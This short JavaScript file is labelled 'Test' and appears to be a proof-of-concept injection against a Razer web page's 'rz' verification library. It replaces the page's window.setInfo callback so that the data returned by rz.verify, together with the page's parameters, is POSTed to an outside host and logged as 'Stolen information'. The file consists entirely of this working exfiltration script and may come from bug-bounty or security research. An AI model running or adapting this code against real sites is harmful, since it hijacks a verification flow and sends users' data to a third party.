/**
 * Test
 */

razerInjection = () => {

    // Hook the function fired after the rz.verify.
    window.setInfo = (data) => {
        var pst= [data,_params];
        var xhr = new XMLHttpRequest();
        xhr.open('POST','https://evanricafort.com/bcprivatetest');
        xhr.send(JSON.stringify(pst))
        console.log('Stolen information ', pst);
    };

    window.rz.init(_params);
    window.rz.verify();

}
razerInjection();